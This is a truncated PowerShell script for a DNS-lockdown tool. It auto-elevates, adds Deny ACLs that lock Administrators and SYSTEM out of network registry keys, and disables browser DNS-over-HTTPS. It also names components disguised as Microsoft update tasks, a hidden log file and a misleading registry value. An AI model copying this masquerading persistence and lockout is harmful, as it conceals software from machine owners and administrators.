<#
.SYNOPSIS
    Enterprise DNS Hijack Protection & Installer Suite (IPv4 & IPv6 + DoH)
.DESCRIPTION
    A highly verbose, enterprise-grade PowerShell tool that enforces a Zero-Trust 
    Registry padlock on network interface DNS configurations and closes browser DoH loopholes.
    
    NEW FEATURES:
    - Global CLI: Installs 'dnslock' command to Windows PATH for easy cmd access.
    - Automated Installation: Creates a Scheduled Task to re-apply locks automatically on boot/network change.
    - Background Service: Protects against Windows Updates and driver reinstalls.
    - Advanced Auditing: UI now tracks active GPO enforcement and Installation status.
    - Payload Self-Defense: NTFS ACL hardening locks the installation directory against tampering.
#>

param (
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$Lock,
    [switch]$Unlock,
    [switch]$SilentLock,
    [switch]$ToggleOn,
    [switch]$ToggleOff,
    [switch]$GodModeStatus,
    [switch]$Launch,
    [switch]$Verbose,
    [switch]$InstallGodMode,
    [switch]$UninstallGodMode,
    [switch]$DumpLogs,
    [switch]$DebugMode
)

# ============================================================================
# 0. EXECUTION POLICY AUTO-SET
# ============================================================================
try {
    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
} catch {
    # Policy may already be set or restricted by GPO; continue silently
}

# ============================================================================
# 0.5 POWERSHELL 7 PREFERRED LAUNCHER
# ============================================================================
if ($PSVersionTable.PSVersion.Major -le 5) {
    $Pwsh7 = Get-Command -Name pwsh -CommandType Application -ErrorAction SilentlyContinue
    if ($Pwsh7) {
        $ArgList = @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"")
        $Bound = $PSBoundParameters.GetEnumerator() | ForEach-Object {
            if ($_.Value -is [switch] -and $_.Value.IsPresent) {
                "-$($_.Key)"
            }
        }
        if ($Bound) { $ArgList += $Bound }
        Start-Process -FilePath $Pwsh7.Source -ArgumentList $ArgList -Wait -NoNewWindow
        Exit
    }
}

# ============================================================================
# 1. AUTO-ELEVATION & PRE-FLIGHT CHECKS
# ============================================================================

# Automatically relaunch as Administrator if not already elevated
$Principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$Role = [Security.Principal.WindowsBuiltInRole]::Administrator
if (-not $Principal.IsInRole($Role)) {
    if ($Install -or $Uninstall -or $Lock -or $Unlock -or $SilentLock) {
        Write-Warning "CRITICAL: Administrative privileges required for CLI commands. Access Denied."
        Exit
    }
    Write-Warning "Administrative privileges required. Attempting auto-elevation..."
    Start-Sleep -Seconds 1
    try {
        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessInfo.FileName = (Get-Process -Id $PID).Path
        
        # Forward any CLI flags (like -Uninstall) to the elevated process
        $ArgsString = ""
        if ($Install) { $ArgsString += " -Install" }
        if ($Uninstall) { $ArgsString += " -Uninstall" }
        if ($Lock) { $ArgsString += " -Lock" }
        if ($Unlock) { $ArgsString += " -Unlock" }
        if ($SilentLock) { $ArgsString += " -SilentLock" }
        if ($DebugMode) { $ArgsString += " -DebugMode" }
        if ($Verbose) { $ArgsString += " -Verbose" }

        $ProcessInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $ArgsString"
        $ProcessInfo.Verb = "runAs"
        $ProcessInfo.UseShellExecute = $true
        [System.Diagnostics.Process]::Start($ProcessInfo) | Out-Null
        Exit
    } catch {
        Write-Error "Failed to elevate. Please right-click and 'Run as Administrator'."
        Pause
        Exit
    }
}

# Define Installation Paths
$InstallDir = "C:\ProgramData\DNSGuard"
$InstallScript = Join-Path -Path $InstallDir -ChildPath "DNS_Lockdown.ps1"
$CmdPath = "C:\Windows\dnslock.cmd"
$TaskName = "DNS-Hijack-Guard"

# Setup Auto-Logging in the same directory as the script
$ScriptDir = Split-Path -Parent -Path $PSCommandPath
if (-not $ScriptDir) { $ScriptDir = $PWD.Path }
# Log to a writable location (not the hardened install dir) so admin can still write
$LogFile = Join-Path -Path $env:TEMP -ChildPath "DNS_Lockdown_Enterprise.log"
$DebugLogFile = Join-Path -Path $env:TEMP -ChildPath "DNS_Lockdown_Enterprise.debug.log"

$GodModeFlagRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
$GodModeFlagRegName = "GodModeActive"
$GodModeLogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
$GodModeTaskPrefix = "MicrosoftEdgeUpdateTask_"

$GodModeInstallDir     = "C:\ProgramData\GodMode"
$GodModeInstallScript  = Join-Path -Path $GodModeInstallDir -ChildPath "GodMode.ps1"
$GodModeCmdPath        = "C:\Windows\godmode.cmd"
$GodModeTaskName       = "Windows-Update-Health-Monitor"
$GodModeGuardianName   = "Windows-Update-Health-Check"

# Raw debug dump rotation settings
$RawDumpDir = Join-Path $env:TEMP "GodMode_RawDumps"
$MaxRawDumps = 5

function Write-Log {
    param ([string]$Message, [string]$Type = "INFO", [ConsoleColor]$Color = "White")
    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try { "[$TimeStamp] [$Type] $Message" | Out-File -FilePath $LogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
    
    # Only print to screen if we are NOT running silently in the background
    if (-not $SilentLock) {
        Write-Host "[$Type] $Message" -ForegroundColor $Color
    }
}

function Write-DebugLog {
    param (
        [string]$FunctionName,
        [string]$Action = "ENTRY", # ENTRY, EXIT, ERROR, WARN, INFO
        [string]$Message = "",
        [System.Management.Automation.ErrorRecord]$ErrorRecord = $null
    )
    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Line = $MyInvocation.ScriptLineNumber
    try {
        if ($ErrorRecord) {
            $Stack = $ErrorRecord.ScriptStackTrace -replace "`r`n", " | "
            $Detail = "[$TimeStamp] [DEBUG] [$Action] [$FunctionName] [$Line] $Message | Exception: $($ErrorRecord.Exception.Message) | Stack: $Stack"
        } else {
            $Detail = "[$TimeStamp] [DEBUG] [$Action] [$FunctionName] [$Line] $Message"
        }
        $Detail | Out-File -FilePath $DebugLogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue
        # Also mirror to main log if DebugMode is enabled
        if ($DebugMode -or $Verbose) {
            $Detail | Out-File -FilePath $LogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue
        }
    } catch {}
}

function Invoke-WithDebug {
    param (
        [string]$FunctionName,
        [scriptblock]$ScriptBlock
    )
    Write-DebugLog -FunctionName $FunctionName -Action "ENTRY"
    try {
        $Result = & $ScriptBlock
        Write-DebugLog -FunctionName $FunctionName -Action "EXIT" -Message "Success"
        return $Result
    } catch {
        $ErrorRecord = $_
        Write-DebugLog -FunctionName $FunctionName -Action "ERROR" -Message "Exception occurred" -ErrorRecord $ErrorRecord
        Write-Log -Message "[$FunctionName] Error: $($ErrorRecord.Exception.Message)" -Type "ERROR" -Color Red
        throw $ErrorRecord
    }
}

function Export-RawDebugDump {
    param(
        [string]$Trigger = "Manual",
        [string]$DumpDir = $RawDumpDir,
        [int]$KeepCount = $MaxRawDumps
    )
    try {
        if (-not (Test-Path $DumpDir)) { New-Item -ItemType Directory -Path $DumpDir -Force | Out-Null }
        # Rotate: keep only $KeepCount most recent dumps
        Get-ChildItem -Path $DumpDir -Filter "GodMode_RawDump_*.log" -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending |
            Select-Object -Skip $KeepCount |
            Remove-Item -Force -ErrorAction SilentlyContinue
        $Timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
        $DumpFile = Join-Path $DumpDir "GodMode_RawDump_${Timestamp}_${Trigger}.log"
        $Dump = @()
        $Dump += "===== GOD MODE RAW DEBUG DUMP ====="
        $Dump += "Trigger: $Trigger"
        $Dump += "Generated: $(Get-Date)"
        $Dump += "Script: $PSCommandPath"
        $Dump += "PID: $PID"
        $Dump += "PSVersion: $($PSVersionTable.PSVersion)"
        $Dump += "PSPath: $($PSHome)"
        $Dump += "OS: $((Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption)"
        $Dump += "User: $([Environment]::UserName)"
        $Dump += "Computer: $([Environment]::MachineName)"
        $Dump += "IsAdmin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
        $Dump += "IsBuiltInAdmin: $(([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -like '*-500'))"
        $Dump += ""
        $Dump += "===== ENVIRONMENT VARIABLES ====="
        $Dump += (Get-ChildItem Env: -ErrorAction SilentlyContinue | Select-Object Name, Value | Out-String)
        $Dump += ""
        $Dump += "===== LOADED MODULES ====="
        $Dump += (Get-Module | Select-Object Name, Version, Path | Out-String)
        $Dump += ""
        $Dump += "===== RUNNING PROCESSES (Top 20) ====="
        $Dump += (Get-Process -ErrorAction SilentlyContinue | Sort-Object CPU -Descending | Select-Object -First 20 | Out-String)
        $Dump += ""
        $Dump += "===== `$ERROR VARIABLE (Last 20) ====="
        if ($Error.Count -gt 0) {
            $Dump += ($Error | Select-Object -First 20 | ForEach-Object {
                "Exception: $($_.Exception.Message)`nStackTrace: $($_.ScriptStackTrace)`nCategory: $($_.CategoryInfo)`n---"
            } | Out-String)
        } else {
            $Dump += '[No errors in $Error]'
        }
        $Dump += ""
        $Dump += "===== MAIN LOG ====="
        if (Test-Path $LogFile) { $Dump += (Get-Content -Raw $LogFile -ErrorAction SilentlyContinue) } else { $Dump += '[No main log]' }
        $Dump += ""
        $Dump += "===== DEBUG LOG ====="
        if (Test-Path $DebugLogFile) { $Dump += (Get-Content -Raw $DebugLogFile -ErrorAction SilentlyContinue) } else { $Dump += '[No debug log]' }
        $Dump += ""
        $Dump += "===== GOD MODE LOG ====="
        if (Test-Path $GodModeLogFile) { $Dump += (Get-Content -Raw $GodModeLogFile -ErrorAction SilentlyContinue) } else { $Dump += '[No GodMode log]' }
        $Dump += ""
        $Dump += "===== RAW DUMP COMPLETE ====="
        $Dump -join "`r`n" | Out-File -FilePath $DumpFile -Encoding UTF8 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Raw debug dump created: $DumpFile" -Type "DEBUG" -Color Gray
        return $DumpFile
    } catch {
        Write-Log -Message "Failed to create raw debug dump: $_" -Type "ERROR" -Color Red
        return $null
    }
}

# Global uncaught error trap: dump raw debug state and log, then break
trap {
    Export-RawDebugDump -Trigger "UNCAUGHT_TRAP"
    Write-Log -Message "UNCAUGHT TRAP: $($_.Exception.Message) | Stack: $($_.ScriptStackTrace)" -Type "ERROR" -Color Red
    break
}

if (-not $SilentLock) { Write-Log -Message "Enterprise Diagnostics Suite Initialized." -Type "SYSTEM" -Color Cyan }

# ============================================================================
# 2. SYSTEM AUDIT & HARDWARE DISCOVERY
# ============================================================================

function Run-SystemAudit {
    Write-Log -Message "Running Pre-Flight System Audit..." -Type "AUDIT" -Color DarkGray
    $OS = Get-CimInstance Win32_OperatingSystem
    Write-Log -Message "OS Version: $($OS.Caption) (Build $($OS.BuildNumber))" -Type "AUDIT" -Color DarkGray
    Write-Log -Message "PS Version: $($PSVersionTable.PSVersion)" -Type "AUDIT" -Color DarkGray
    Write-Log -Message "Execution Path: $ScriptDir" -Type "AUDIT" -Color DarkGray
}

if (-not $SilentLock) { Run-SystemAudit }

# Fetch all network adapters (excluding hidden virtual ones if possible, but keeping all physical)
$Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue } # Fallback

$SidAdmin = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
$SidSystem = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
# Network UI restrictions are USER policies (HKCU) -- they gray out the adapter properties UI
$GpoPath = "HKCU:\Software\Policies\Microsoft\Windows\Network Connections"

# Define Browser DoH GPO Paths
$EdgePath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
$ChromePath = "HKLM:\SOFTWARE\Policies\Google\Chrome"
$FirefoxPath = "HKLM:\SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS"

# ============================================================================
# 3. STATUS CHECKER MODULE (ENHANCED UI)
# ============================================================================

function Get-DNSLockStatus {
    $AllLocked = $true
    $AnyLocked = $false

    # Refresh adapter list each time (USB/Wi-Fi may change while menu is open)
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }

    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " LIVE HARDWARE ADAPTER STATUS " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # --- 1. CHECK HARDWARE ADAPTERS ---
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $AdapterLocked = $false
        $StatusColor = if ($Adapter.Status -eq "Up") { "Green" } else { "DarkGray" }

        # Display Hardware Data
        Write-Host ("  Hardware: {0,-25} | State: {1,-5} | MAC: {2}" -f $Adapter.Name, $Adapter.Status, $Adapter.MacAddress) -ForegroundColor $StatusColor

        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny") {
                                $AdapterLocked = $true
                            }
                        } catch {} 
                    }
                    $RegKey.Close()
                }
            } catch {}
        }

        # Visual Output Logic
        if ($AdapterLocked) {
            Write-Host "  `-> Security: [X] LOCKED (IPv4/IPv6)" -ForegroundColor Red
            Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
            $AnyLocked = $true
        } else {
            Write-Host "  `-> Security: [ ] UNLOCKED (Vulnerable)" -ForegroundColor Green
            Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
            $AllLocked = $false
        }
    }

    # --- 2. CHECK SYSTEM POLICIES & INSTALLATION ---
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " SYSTEM POLICIES & PERSISTENCE " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # Check Real-Time GPO Enforcement (each policy checked independently)
    $GpoEnforced = $true

    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if (-not $NetConn -or $NetConn.NC_LanProperties -ne 0) { $GpoEnforced = $false }

    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -ne "off") { $GpoEnforced = $false }

    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -ne "off") { $GpoEnforced = $false }

    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -ne 0) { $GpoEnforced = $false }

    if ($GpoEnforced) {
        Write-Host "  [X] GPO Restrictions   -> ENFORCED (Browsers & GUI)" -ForegroundColor Red
    } else {
        Write-Host "  [ ] GPO Restrictions   -> NOT ENFORCED" -ForegroundColor Green
        $AllLocked = $false # System isn't fully secure if GPOs are missing
    }

    # Check Service Installation Status
    $TaskExists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    $CmdExists = Test-Path $CmdPath

    if ($TaskExists -and $CmdExists) {
        Write-Host "  [X] Background Service -> INSTALLED ('dnslock' active)" -ForegroundColor Cyan
    } else {
        Write-Host "  [ ] Background Service -> NOT INSTALLED" -ForegroundColor DarkGray
    }

    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # --- 3. INTEGRITY CHECK ---
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " INTEGRITY CHECK " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray
    if (Test-Path $InstallScript) {
        $ExpectedHash = $null
        try { $ExpectedHash = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings" -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}
        if (-not $ExpectedHash -and (Test-Path (Join-Path $InstallDir "integrity.sha256"))) {
            $ExpectedHash = Get-Content -Path (Join-Path $InstallDir "integrity.sha256") -Raw
        }
        if ($ExpectedHash) {
            $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
            if ($ExpectedHash.Trim() -eq $ActualHash.Trim()) {
                Write-Host "  [X] Script Integrity    -> VERIFIED" -ForegroundColor Green
            } else {
                Write-Host "  [ ] Script Integrity    -> TAMPER DETECTED" -ForegroundColor Red
                Write-Host "`n  >>> TAMPER DETECTED! ACTION REQUIRED <<<" -ForegroundColor Black -BackgroundColor Yellow
                Write-Host "  - Run a full antivirus scan immediately." -ForegroundColor Yellow
                Write-Host "  - Do NOT use options [1] or [2] (they may run malicious code)." -ForegroundColor Yellow
                Write-Host "  - Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
                Write-Host "`n  HOW TO CHECK FOR MALICIOUS TASKS:" -ForegroundColor Cyan
                Write-Host "  1. Press Win + R, type: taskschd.msc  (press Enter)" -ForegroundColor White
                Write-Host "  2. Click 'Task Scheduler Library' on the left" -ForegroundColor White
                Write-Host "  3. Look for tasks you don't recognize (sort by Author)" -ForegroundColor White
                Write-Host "  4. Double-click suspicious tasks, check the 'Actions' tab" -ForegroundColor White
                Write-Host "  5. Delete anything running powershell/cmd from weird paths" -ForegroundColor White
                Write-Host "`n  QUICK POWERShell CHECK (run as admin):" -ForegroundColor Cyan
                Write-Host "  Get-ScheduledTask | Where-Object {`$_.TaskPath -eq '\' -and `$_.Author -notmatch 'Microsoft'} | Select-Object TaskName, Author, State" -ForegroundColor White
            }
        } else {
            Write-Host "  [ ] Script Integrity    -> NO BASELINE" -ForegroundColor DarkGray
        }
    } else {
        Write-Host "  [ ] Script Integrity    -> NOT INSTALLED" -ForegroundColor DarkGray
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # Master Status Banner Logic
    if ($AllLocked -and $GpoEnforced) { 
        Write-Host " >>> SYSTEM IS SECURE: ZERO-TRUST PADLOCK ACTIVE <<< " -ForegroundColor White -BackgroundColor DarkRed 
    } elseif ($AnyLocked -or $GpoEnforced) {
        Write-Host " >>> SYSTEM IS PARTIALLY SECURE: MIXED STATE <<< " -ForegroundColor Black -BackgroundColor Yellow 
    } else { 
        Write-Host " >>> SYSTEM IS UNSECURE: PADLOCK INACTIVE <<< " -ForegroundColor White -BackgroundColor DarkGreen 
    }
    
    return $AllLocked
}

function Test-IntegrityStatus {
    # Returns $true if installed and hash matches; $false if tampered; $null if not installed
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    if (-not (Test-Path $InstallScript)) { return $null }
    $ExpectedHash = $null
    try { $ExpectedHash = (Get-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}
    if (-not $ExpectedHash -and (Test-Path $IntegrityFile)) { $ExpectedHash = Get-Content -Path $IntegrityFile -Raw }
    if (-not $ExpectedHash) { return $null }
    $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
    return ($ExpectedHash.Trim() -eq $ActualHash.Trim())
}

function Harden-RegistryKey {
    param(
        [string]$Path,
        [switch]$IsCurrentUser
    )
    try {
        $Hive = if ($IsCurrentUser) { [Microsoft.Win32.Registry]::CurrentUser } else { [Microsoft.Win32.Registry]::LocalMachine }
        $SubKeyPath = $Path -replace '^HKLM:\\' -replace '^HKCU:\\'
        
        $RegKey = $Hive.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        if (-not $RegKey) { 
            Write-Log -Message "Registry key not found for hardening: $Path" -Type "WARN" -Color Yellow
            return $false 
        }
        
        $Acl = $RegKey.GetAccessControl()
        
        # Remove inheritance (convert inherited to explicit)
        $Acl.SetAccessRuleProtection($true, $true)
        
        # Remove existing deny rules for the SIDs we will harden
        $RulesToRemove = @()
        foreach ($Rule in $Acl.Access) {
            if ($Rule.AccessControlType -eq "Deny") {
                try {
                    $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                    if ($RuleSid.Value -in @("S-1-5-32-544", "S-1-1-0", "S-1-5-11", "S-1-5-18")) {
                        $RulesToRemove += $Rule
                    }
                } catch {}
            }
        }
        foreach ($Rule in $RulesToRemove) {
            $Acl.RemoveAccessRule($Rule) | Out-Null
        }
        
        # Deny Admins dangerous rights
        $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "SetValue,CreateSubkey,Delete,WriteKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        # Deny Everyone
        $SidEveryone = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
        $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidEveryone, "SetValue,CreateSubkey,Delete,WriteKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        # Deny Authenticated Users
        $SidAuthUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
        $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAuthUsers, "SetValue,CreateSubkey,Delete,WriteKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        $RegKey.SetAccessControl($Acl)
        $RegKey.Close()
        Write-Log -Message "Hardened registry key: $Path" -Type "SUCCESS" -Color Green
        return $true
    } catch {
        Write-Log -Message "Failed to harden registry key $Path`: $_" -Type "WARN" -Color Yellow
        return $false
    }
}

function Restore-RegistryKey {
    param(
        [string]$Path,
        [switch]$IsCurrentUser
    )
    try {
        $Hive = if ($IsCurrentUser) { [Microsoft.Win32.Registry]::CurrentUser } else { [Microsoft.Win32.Registry]::LocalMachine }
        $SubKeyPath = $Path -replace '^HKLM:\\' -replace '^HKCU:\\'
        
        $RegKey = $Hive.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        if (-not $RegKey) { return $false }
        
        $Acl = $RegKey.GetAccessControl()
        
        # Remove deny rules for Admin, Everyone, Authenticated Users, and SYSTEM
        $RulesToRemove = @()
        foreach ($Rule in $Acl.Access) {
            if ($Rule.AccessControlType -eq "Deny") {
                try {
                    $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                    if ($RuleSid.Value -in @("S-1-5-32-544", "S-1-1-0", "S-1-5-11", "S-1-5-18")) {
                        $RulesToRemove += $Rule
                    }
                } catch {}
            }
        }
        
        foreach ($Rule in $RulesToRemove) {
            $Acl.RemoveAccessRule($Rule) | Out-Null
        }
        
        # Re-enable inheritance
        $Acl.SetAccessRuleProtection($false, $false)
        
        $RegKey.SetAccessControl($Acl)
        $RegKey.Close()
        Write-Log -Message "Restored registry key: $Path" -Type "SUCCESS" -Color Green
        return $true
    } catch {
        Write-Log -Message "Direct restore failed for $Path`: $_" -Type "WARN" -Color Yellow
        $FallbackScript = "C:\Windows\Temp\RestoreReg_$([Guid]::NewGuid().ToString()).ps1"
        $PsCode = "try { `$k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('$SubKeyPath', [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions); if (`$k) { `$a = `$k.GetAccessControl(); foreach (`$r in `$a.Access) { if (`$r.AccessControlType -eq 'Deny') { try { `$sid = `$r.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]); if (`$sid.Value -in @('S-1-5-32-544','S-1-1-0','S-1-5-11','S-1-5-18')) { [void]`$a.RemoveAccessRule(`$r) } } catch {} } }; `$a.SetAccessRuleProtection(`$false,`$false); `$k.SetAccessControl(`$a); `$k.Close(); exit 0 } else { exit 1 } } catch { exit 1 }"
        Set-Content -Path $FallbackScript -Value $PsCode -Encoding UTF8 -Force
        $Result = Invoke-AsSystem -Command "powershell.exe -ExecutionPolicy Bypass -File `"$FallbackScript`""
        Remove-Item -Path $FallbackScript -Force -ErrorAction SilentlyContinue
        if ($Result.Success) {
            Write-Log -Message "Restored registry key via SYSTEM: $Path" -Type "SUCCESS" -Color Green
            return $true
        } else {
            Write-Log -Message "Failed to restore registry key via SYSTEM: $Path. Output: $($Result.Output)" -Type "WARN" -Color Yellow
            return $false
        }
    }
}

# ============================================================================
# 4. LOCKDOWN MODULE (ENABLE)
# ============================================================================

function Enable-DNSLock {
    Write-DebugLog -FunctionName "Enable-DNSLock" -Action "ENTRY"
    Write-Log -Message "Initiating Targeted Lock (Admin/SYSTEM Only on IPv4 & IPv6)..." -Type "ACTION" -Color Magenta

    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }

            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()

                    $Rule1 = New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "SetValue", "Deny")
                    $Rule2 = New-Object System.Security.AccessControl.RegistryAccessRule($SidSystem, "SetValue", "Deny")

                    $Acl.AddAccessRule($Rule1)
                    $Acl.AddAccessRule($Rule2)

                    $RegKey.SetAccessControl($Acl)
                    Write-Log -Message "Applied lock ($Proto) for adapter: $($Adapter.Name)" -Type "SUCCESS" -Color Green

                    # Only print raw output if we aren't running silently in the background
                    if (-not $SilentLock) {
                        Write-Host "  > [RAW ACL DUMP FOR $($Adapter.Name) - $Proto]" -ForegroundColor DarkGray
                        $RegKey.GetAccessControl().Access | Where-Object { $_.AccessControlType -eq 'Deny' } | Format-Table IdentityReference, AccessControlType, RegistryRights -AutoSize | Out-String | Write-Host -ForegroundColor DarkGray
                    }
                    $RegKey.Close()
                }
            } catch {
                Write-Log -Message "Failed to lock $Proto adapter $($Adapter.Name)." -Type "ERROR" -Color Red
            }
        }
    }

    Write-Log -Message "Applying visual GPO restrictions..." -Type "INFO" -Color Yellow
    if (-not (Test-Path $GpoPath)) { New-Item -Path $GpoPath -Force -ErrorAction SilentlyContinue | Out-Null }
    Set-ItemProperty -Path $GpoPath -Name "NC_LanProperties" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $GpoPath -Name "NC_LanChangeProperties" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $GpoPath -Name "NC_AllowAdvancedTCPIPConfig" -Value 0 -Force -ErrorAction SilentlyContinue

    Write-Log -Message "Enforcing Browser DoH Restrictions (Edge, Chrome, Firefox)..." -Type "INFO" -Color Yellow
    # Edge
    if (!(Test-Path $EdgePath)) { New-Item -Path $EdgePath -Force | Out-Null }
    Set-ItemProperty -Path $EdgePath -Name "DnsOverHttpsMode" -Value "off" -Force
    Set-ItemProperty -Path $EdgePath -Name "BuiltInDnsClientEnabled" -Value 0 -Force
    # Chrome
    if (!(Test-Path $ChromePath)) { New-Item -Path $ChromePath -Force | Out-Null }
    Set-ItemProperty -Path $ChromePath -Name "DnsOverHttpsMode" -Value "off" -Force
    # Firefox
    if (!(Test-Path $FirefoxPath)) { New-Item -Path $FirefoxPath -Force | Out-Null }
    Set-ItemProperty -Path $FirefoxPath -Name "Enabled" -Value 0 -Force

    Write-Log -Message "Resetting Network Stack..." -Type "INFO" -Color Yellow
    ipconfig /flushdns | Out-Null

    # Only force DHCP renewal during interactive runs; avoid network disruption in background task
    if (-not $SilentLock) {
        ipconfig /renew | Out-Null
        Write-Log -Message "Protection deployed. DHCP Lease Renewal Successful!" -Type "SUCCESS" -Color Green
    } else {
        Write-Log -Message "Protection deployed silently (no DHCP renewal in background task)." -Type "SUCCESS" -Color Green
    }

    # Harden registry ACLs to prevent tampering
    Write-Log -Message "Hardening registry ACLs to prevent tampering..." -Type "INFO" -Color Yellow
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid"
